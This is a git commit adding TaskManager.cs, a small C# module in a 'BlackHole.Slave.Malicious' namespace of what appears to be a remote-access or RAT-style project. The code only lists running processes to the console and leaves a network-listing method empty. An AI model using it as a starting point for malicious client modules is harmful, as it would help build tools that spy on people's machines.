652ced8e82ac91d34bd3cad446cabdb96eb44a30
FlyRabbit <etenal@foxmail.com>
2018-03-06 00:13:03 +0800

    原始程序

---
+++ ClassAssistance/BlackHole/BlackHole.Slave/Malicious/TaskManager.cs
@@ -0,0 +1,34 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using BlackHole.Common;
+using System.Diagnostics;
+
+namespace BlackHole.Slave.Malicious
+{
+    public sealed class TaskManager : Singleton<TaskManager>, IMalicious
+    {
+        public void Initialize()
+        {
+            GetProcessList();
+            GetNetworkList();
+        }
+
+        private void GetProcessList()
+        {
+            Process[] processlist = Process.GetProcesses();
+
+            foreach (Process theprocess in processlist)
+            {
+                Console.WriteLine("Process: {0} ID: {1}", theprocess.ProcessName, theprocess.Id);
+            }
+        }
+
+        private void GetNetworkList()
+        {
+
+        }
+    }
+}
